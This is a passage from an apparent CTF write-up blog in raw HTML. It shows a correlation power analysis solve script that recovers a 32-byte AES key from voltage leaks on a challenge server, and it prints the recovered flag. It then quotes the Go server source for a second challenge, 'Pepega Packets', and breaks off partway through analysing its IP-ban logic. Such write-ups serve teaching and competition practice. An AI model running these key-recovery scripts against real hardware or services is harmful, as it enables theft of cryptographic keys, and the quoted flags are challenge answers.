&lt;li&gt;the key we are trying to recover is longer (also 32 bytes instead of 16), but I didn&amp;rsquo;t know this until later on&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;We can easily solve the first issue by connecting multiple times to the server and gathering a large number of samples, and for the second issue, since AES block sizes are usually 16 bytes, I simply cut off the last 16 bytes of the 32 bytes for now.&lt;/p&gt;
&lt;p&gt;Here is the code to collect the samples:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-py&#34; data-lang=&#34;py&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; pwn &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;plaintexts &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; []
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;leaks &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; []
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; _ &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(&lt;span style=&#34;color:#ae81ff&#34;&gt;200&lt;/span&gt;):
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    r &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; remote(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;aes-observed.zajebistyc.tf&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;9999&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvline()
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(&lt;span style=&#34;color:#ae81ff&#34;&gt;50&lt;/span&gt;):
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        resp &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvline()&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;strip()&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;decode()&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;split(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\t&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        pt &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; bytes&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;fromhex(resp[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;])[:&lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;] &lt;span style=&#34;color:#75715e&#34;&gt;# only consider first 16 bytes&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        leak &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; float(resp[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;])
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        arr &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [v &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; v &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; pt]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        plaintexts&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;append(np&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;array(arr))
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        leaks&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;append([leak,leak]) &lt;span style=&#34;color:#75715e&#34;&gt;# has to be in this format for the attack&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;close()
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;We collect 10000 samples in total, which should be sufficient to perform the attack and recover the key.&lt;/p&gt;
&lt;p&gt;Next, we perform the CPA attack in the exact same way as the article.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-py&#34; data-lang=&#34;py&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ths &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; read_ths_from_ram(samples&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;np&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;array(leaks), plaintext&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;np&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;array(plaintexts))
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;attack &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; scared&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;CPAAttack(selection_function&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;scared&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;aes&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;selection_functions&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;encrypt&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;FirstSubBytes(), 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                          model&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;scared&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;Monobit(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;), 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                          discriminant&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;scared&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;nanmax,  &lt;span style=&#34;color:#75715e&#34;&gt;# Positive correlation expected&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                          convergence_step&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;50&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;attack&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;run(scared&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;Container(ths))
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;found_key &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; np&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;nanargmax(attack&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;scores, axis&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;astype(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;uint8&amp;#39;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;print(found_key)
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Combining the code and running it, we recover the key in decimal format: &lt;code&gt;[112  52 123  79 115  99 105 108 108 111 115  99 111 112 101 115]&lt;/code&gt;. A quick from decimal in CyberChef gives us the flag:&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;p4{Oscilloscopes
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;However, it doesn&amp;rsquo;t seem to be the full flag. We assumed at the start that the key size is 16 bytes as it is the most common key size, but AES keys can actually be 16, 24 or 32 bytes.&lt;/p&gt;
&lt;p&gt;Remembering that we neglected the last 16 bytes of the plaintext, we re-run the script - this time, only considering the last 16 bytes of the plaintext.&lt;/p&gt;
&lt;p&gt;We simply modify the line &lt;code&gt;pt = bytes.fromhex(resp[0])[:16]&lt;/code&gt; to &lt;code&gt;[16:]&lt;/code&gt; to do so.&lt;/p&gt;
&lt;p&gt;This works as we recover the last 16 bytes of the key, which is &lt;code&gt;? Still_matter!}&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;The full flag we get is &lt;code&gt;p4{Oscilloscopes? Still_matter!}&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Full cleaned solve script:&lt;/p&gt;



  &lt;div class=&#34;collapsable-code&#34;&gt;
    &lt;input id=&#34;3&#34; type=&#34;checkbox&#34; checked /&gt;
    &lt;label for=&#34;3&#34;&gt;
      &lt;span class=&#34;collapsable-code__language&#34;&gt;python&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__title&#34;&gt;solve.py&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;Show&#34; data-label-collapse=&#34;Hide&#34;&gt;&lt;/span&gt;
    &lt;/label&gt;
    &lt;pre class=&#34;language-python&#34; &gt;&lt;code&gt;
from pwn import *

import numpy as np
from tqdm.notebook import tqdm
from estraces import read_ths_from_ram
import scared

plaintexts1 = []
plaintexts2 = []
leaks = [] # voltage

for _ in range(200):
    r = remote(&amp;#34;aes-observed.zajebistyc.tf&amp;#34;,9999)
    r.recvline()
    for i in range(50):
        resp = r.recvline().strip().decode().split(&amp;#34;\t&amp;#34;)
        pt1 = bytes.fromhex(resp[0])[:16]
        pt2 = bytes.fromhex(resp[0])[16:]
        leak = float(resp[1])
        arr = [v for v in pt1]
        plaintexts1.append(np.array(arr))
        arr = [v for v in pt2]
        plaintexts2.append(np.array(arr))
        leaks.append([leak,leak]) # has to be in this format for the attack
    r.close()

# Run attack for first 16 bytes of key
ths = read_ths_from_ram(samples=np.array(leaks), plaintext=np.array(plaintexts1))
attack = scared.CPAAttack(selection_function=scared.aes.selection_functions.encrypt.FirstSubBytes(), 
                          model=scared.Monobit(0), 
                          discriminant=scared.nanmax,  # Positive correlation expected
                          convergence_step=50)
attack.run(scared.Container(ths))

found_key = np.nanargmax(attack.scores, axis=0).astype(&amp;#39;uint8&amp;#39;)

print(found_key)

# Run attack for last 16 bytes of key
ths = read_ths_from_ram(samples=np.array(leaks), plaintext=np.array(plaintexts2))
attack = scared.CPAAttack(selection_function=scared.aes.selection_functions.encrypt.FirstSubBytes(), 
                          model=scared.Monobit(0), 
                          discriminant=scared.nanmax,  # Positive correlation expected
                          convergence_step=50)
attack.run(scared.Container(ths))

found_key = np.nanargmax(attack.scores, axis=0).astype(&amp;#39;uint8&amp;#39;)

print(found_key)

# p4{Oscilloscopes? Still_matter!}
&lt;/code&gt;&lt;/pre&gt;
  &lt;/div&gt;


&lt;h1 id=&#34;pepega-packets-misc---5-solves&#34;&gt;Pepega Packets (misc) - 5 solves&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;Can you be faster enough?&lt;br&gt;
&lt;code&gt;http://10.0.XXX.2:80&lt;/code&gt;&lt;br&gt;
NOTE: Every team have separate ip address, please look on your paper from sanity check :)&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;This is probably the hardest I&amp;rsquo;ve ever cheese&amp;rsquo;d a challenge - and it was first blood as well&amp;hellip;&lt;/p&gt;
&lt;p&gt;We are given the server&amp;rsquo;s code:&lt;/p&gt;



  &lt;div class=&#34;collapsable-code&#34;&gt;
    &lt;input id=&#34;4&#34; type=&#34;checkbox&#34; checked /&gt;
    &lt;label for=&#34;4&#34;&gt;
      &lt;span class=&#34;collapsable-code__language&#34;&gt;go&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__title&#34;&gt;server.go&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;Show&#34; data-label-collapse=&#34;Hide&#34;&gt;&lt;/span&gt;
    &lt;/label&gt;
    &lt;pre class=&#34;language-go&#34; &gt;&lt;code&gt;
package main

import (
	&amp;#34;context&amp;#34;
	&amp;#34;errors&amp;#34;
	&amp;#34;fmt&amp;#34;
	&amp;#34;github.com/florianl/go-nflog&amp;#34;
	&amp;#34;github.com/ghedo/go.pkt/layers&amp;#34;
	&amp;#34;github.com/ghedo/go.pkt/packet&amp;#34;
	&amp;#34;github.com/ghedo/go.pkt/packet/ipv4&amp;#34;
	&amp;#34;github.com/ghedo/go.pkt/packet/tcp&amp;#34;
	&amp;#34;log&amp;#34;
	&amp;#34;net&amp;#34;
	&amp;#34;net/http&amp;#34;
	&amp;#34;os&amp;#34;
	&amp;#34;os/exec&amp;#34;
	&amp;#34;strconv&amp;#34;
	&amp;#34;strings&amp;#34;
	&amp;#34;sync&amp;#34;
	&amp;#34;syscall&amp;#34;
	&amp;#34;time&amp;#34;
)

type PacketInfo struct {
	ArrivedAt time.Time

	FromIP   net.IP
	FromPort uint16

	ToIP   net.IP
	ToPort uint16
}

func GetPacketInfo(data []byte) (*PacketInfo, error) {
	netPacket, err := layers.UnpackAll(data, packet.IPv4)
	if err != nil {
		return nil, err
	}

	ipInfo, ok := netPacket.(*ipv4.Packet)
	if !ok {
		return nil, errors.New(&amp;#34;not ip packet&amp;#34;)
	}

	tcpInfo, ok := netPacket.Payload().(*tcp.Packet)
	if !ok {
		return nil, errors.New(&amp;#34;not tcp packet&amp;#34;)
	}

	return &amp;amp;PacketInfo{
		FromIP:   ipInfo.SrcAddr,
		FromPort: tcpInfo.SrcPort,
		ToIP:     ipInfo.DstAddr,
		ToPort:   tcpInfo.DstPort,
	}, nil
}

func GetPacketStream() (chan PacketInfo, error) {
	ctx, cancel := context.WithCancel(context.Background())
	config := nflog.Config{
		Group:    nflogGroup,
		Copymode: nflog.NfUlnlCopyPacket,
		Bufsize:  64,
		Logger:   log.New(os.Stderr, &amp;#34;nflog&amp;#34;, log.LstdFlags),
	}

	nf, err := nflog.Open(&amp;amp;config)
	if err != nil {
		cancel()
		return nil, err
	}

	go func() {
		&amp;lt;-ctx.Done()
		nf.Close()
	}()
	packetStream := make(chan PacketInfo, 65000)

	funcHook := func(msg nflog.Msg) int {
		var packetData []byte
		if msg, exists := msg[nflog.AttrPayload]; exists {
			if msg, ok := msg.([]byte); ok {
				packetData = msg
			}
		}

		var packetTime time.Time
		if msg, exists := msg[nflog.AttrTimestamp]; exists {
			if msg, ok := msg.(time.Time); ok {
				packetTime = msg
			}
		}

		info, err := GetPacketInfo(packetData)
		if err != nil {
			log.Printf(&amp;#34;invalid packet raw=%q&amp;#34;, packetData)
			return 0
		}
		info.ArrivedAt = packetTime

		select {
		case packetStream &amp;lt;- *info:
		default:
			log.Fatalf(&amp;#34;closed channel or overflow&amp;#34;)
			cancel()
		}
		return 0
	}

	err = nf.Register(ctx, funcHook)
	if err != nil {
		cancel()
		return nil, err
	}

	return packetStream, nil
}

func workerFirewall() {
	packetStream, err := GetPacketStream()
	if err != nil {
		log.Fatal(&amp;#34;packetStream err&amp;#34;, err)
	}
	for pkt := range packetStream {
		if GlobalDB.Ban(pkt.FromIP.String(), time.Minute) {
			log.Printf(&amp;#34;banning suspicious connection = %&amp;#43;v\n&amp;#34;, pkt)
		}
	}
}

type localDB struct {
	mu     sync.RWMutex
	banned map[string]time.Time
}

func NewLocalDB() *localDB {
	return &amp;amp;localDB{
		banned: make(map[string]time.Time),
	}
}

func (c *localDB) Ban(remoteIP string, expireDuration time.Duration) bool {
	c.mu.Lock()
	c.banned[remoteIP] = time.Now().Add(expireDuration)
	c.mu.Unlock()
	return true
}

func (c *localDB) IsBanned(remoteIP string) bool {
	c.mu.RLock()
	expireAt, exists := c.banned[remoteIP]
	c.mu.RUnlock()
	if !exists {
		return false
	}
	if time.Since(expireAt).Seconds() &amp;gt; 0 {
		return false
	}
	return true
}

func setupNftables() {
	nftScript := `#!/usr/sbin/nft -f

	table inet chall_pepega_%interface% {}
	delete table inet chall_pepega_%interface%
	table inet chall_pepega_%interface% {
		chain input {
			type filter hook input priority 0; policy accept;
			iif &amp;#34;%interface%&amp;#34; tcp dport %port% log group %nfgroup%
		}
	}
	`
	nftScript = strings.ReplaceAll(nftScript, &amp;#34;%interface%&amp;#34;, interfaceString)
	nftScript = strings.ReplaceAll(nftScript, &amp;#34;%port%&amp;#34;, portString)
	nftScript = strings.ReplaceAll(nftScript, &amp;#34;%nfgroup%&amp;#34;, strconv.Itoa(int(nflogGroup)))

	cmd := exec.Command(&amp;#34;/usr/sbin/nft&amp;#34;, &amp;#34;-f&amp;#34;, &amp;#34;-&amp;#34;)
	cmd.Stdin = strings.NewReader(nftScript)

	output, err := cmd.CombinedOutput()
	if err != nil {
		log.Fatalf(&amp;#34;Error executing nft script: err=%&amp;#43;v\nerror output:\n%s\n&amp;#34;, err, output)
	}
}

func getInterfaceIP(interfaceName string) (net.IP, error) {
	iface, err := net.InterfaceByName(interfaceName)
	if err != nil {
		return nil, err
	}

	addrs, err := iface.Addrs()
	if err != nil {
		return nil, err
	}

	for _, addr := range addrs {
		ipNet, ok := addr.(*net.IPNet)
		if ok &amp;amp;&amp;amp; !ipNet.IP.IsLoopback() {
			if ipNet.IP.To4() != nil {
				return ipNet.IP, nil
			}
		}
	}

	return nil, fmt.Errorf(&amp;#34;no IP address found for interface %s&amp;#34;, interfaceName)
}

func workerHttp() {
	http.HandleFunc(&amp;#34;/&amp;#34;, func(w http.ResponseWriter, r *http.Request) {
		fmt.Fprintln(w, &amp;#34;Welcome to the üê∏packets!!! Now please get fast üê∏ flag!&amp;#34;)
	})
	http.HandleFunc(&amp;#34;/flag&amp;#34;, func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set(&amp;#34;Content-Type&amp;#34;, &amp;#34;text/plain&amp;#34;)
		flusher, ok := w.(http.Flusher)
		if !ok {
			http.Error(w, &amp;#34;Streaming not supported&amp;#34;, http.StatusInternalServerError)
			return
		}
		remoteAddrStr, _, err := net.SplitHostPort(r.RemoteAddr)
		if err != nil {
			http.Error(w, fmt.Sprintf(&amp;#34;Error extracting remote address, ip=%s&amp;#34;, r.RemoteAddr), http.StatusInternalServerError)
			return
		}
		remoteAddr := net.ParseIP(remoteAddrStr).To4()
		if len(remoteAddr) != 4 {
			http.Error(w, fmt.Sprintf(&amp;#34;Error parsing remote address, ip=%s, ip=%s&amp;#34;, r.RemoteAddr, remoteAddrStr), http.StatusInternalServerError)
			return
		}

		for i := 1; i &amp;lt;= 5; i&amp;#43;&amp;#43; {
			fmt.Fprintf(w, &amp;#34;Validating your request [%d/5], please wait üê∏üê∏üê∏\n&amp;#34;, i)
			flusher.Flush()

			if GlobalDB.IsBanned(remoteAddr.String()) {
				fmt.Fprintln(w, &amp;#34;Sad üê∏ You are banned üò¢&amp;#34;)
				return
			}
			time.Sleep(time.Second)
		}

		fmt.Fprintf(w, &amp;#34;Here you go!!! üê∏ Flag: %s&amp;#34;, flagString)
	})

	serverIP, err := getInterfaceIP(interfaceString)
	if err != nil {
		log.Fatal(&amp;#34;getInterfaceIP err: &amp;#34;, err)
	}
	log.Printf(&amp;#34;Listen on %s:%s\n&amp;#34;, serverIP, portString)

	server := &amp;amp;http.Server{
		Addr:         serverIP.String() &amp;#43; &amp;#34;:&amp;#34; &amp;#43; portString,
		Handler:      http.DefaultServeMux,
		ReadTimeout:  10 * time.Second,
		WriteTimeout: 10 * time.Second,
	}
	listener, err := net.Listen(&amp;#34;tcp&amp;#34;, server.Addr)
	if err != nil {
		log.Fatal(&amp;#34;Error creating listener: &amp;#34;, err)
	}
	rawListener, err := listener.(*net.TCPListener).File()
	if err != nil {
		log.Fatal(&amp;#34;Error getting raw listener file: &amp;#34;, err)
	}
	if err := syscall.SetsockoptString(int(rawListener.Fd()), syscall.SOL_SOCKET, syscall.SO_BINDTODEVICE, interfaceString); err != nil {
		log.Fatal(&amp;#34;Error setting SO_BINDTODEVICE option: &amp;#34;, err)
	}
	if err := server.Serve(listener); err != nil {
		log.Fatal(&amp;#34;server.ListenAndServe err: &amp;#34;, err)
	}
}

var GlobalDB *localDB
var flagString string
var portString string
var interfaceString string
var nflogGroup uint16

func main() {
	flagString = os.Getenv(&amp;#34;FLAG&amp;#34;)
	if len(flagString) == 0 {
		log.Fatal(&amp;#34;flag is empty&amp;#34;)
	}

	portString = os.Getenv(&amp;#34;LISTEN_PORT&amp;#34;)
	if len(portString) == 0 {
		portString = &amp;#34;8080&amp;#34;
	}

	interfaceString = os.Getenv(&amp;#34;LISTEN_INTERFACE&amp;#34;)
	if len(interfaceString) == 0 {
		interfaceString = &amp;#34;eth0&amp;#34;
	}

	nflogGroupStr := os.Getenv(&amp;#34;NFLOG_GROUP&amp;#34;)
	if len(nflogGroupStr) == 0 {
		nflogGroupStr = &amp;#34;100&amp;#34;
	}
	nflogGroup64, err := strconv.ParseUint(nflogGroupStr, 10, 16)
	if err != nil {
		log.Fatal(&amp;#34;invalid nflog group&amp;#34;)
	}
	nflogGroup = uint16(nflogGroup64)

	GlobalDB = NewLocalDB()

	setupNftables()

	go workerFirewall()
	workerHttp()
}

&lt;/code&gt;&lt;/pre&gt;
  &lt;/div&gt;


&lt;p&gt;We can see that to get the flag, all you have to do is to request the &lt;code&gt;/flag&lt;/code&gt; endpoint and if you&amp;rsquo;re not banned for 5 seconds, it&amp;rsquo;ll give you the flag.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-go&#34; data-lang=&#34;go&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#a6e22e&#34;&gt;fmt&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Fprintf&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;w&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Validating your request [%d/5], please wait üê∏üê∏üê∏\n&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#a6e22e&#34;&gt;flusher&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Flush&lt;/span&gt;()
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;GlobalDB&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;IsBanned&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;remoteAddr&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;String&lt;/span&gt;()) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#a6e22e&#34;&gt;fmt&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Fprintln&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;w&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Sad üê∏ You are banned üò¢&amp;#34;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#a6e22e&#34;&gt;time&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Sleep&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;time&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Second&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;fmt&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Fprintf&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;w&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Here you go!!! üê∏ Flag: %s&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;flagString&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;It checks if your IP (&lt;code&gt;remoteAddr&lt;/code&gt;) is banned every second for 5 seconds, and we can find that our IP gets banned for 1 minute when we connect to the server initially in &lt;code&gt;workerFirewall()&lt;/code&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-go&#34; data-lang=&#34;go&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;func&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;main&lt;/span&gt;() {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;...&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;go&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;workerFirewall&lt;/span&gt;()
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#a6e22e&#34;&gt;workerHttp&lt;/span&gt;()
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
